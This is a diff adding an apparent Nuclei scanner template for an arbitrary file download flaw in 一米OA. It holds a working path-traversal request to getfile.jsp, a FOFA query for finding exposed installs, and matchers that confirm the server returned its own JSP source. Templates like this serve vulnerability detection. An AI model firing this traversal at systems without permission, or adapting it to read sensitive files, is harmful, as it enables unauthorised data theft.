@@ -1,0 +1,28 @@
+id: poc-yaml-yimi-oa-getfile-jsp-anyfile-download
+info:
+  name: 一米OA getfile.jsp 任意文件下载漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    finger: 一米OA
+    fofa: app="一米OA"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<%@page import=\"java.io.*\" %>"
+      - type: word
+        part: header
+        words:
+          - "Content-disposition"
+          - "attachment; filename=../public/getfile.jsp"
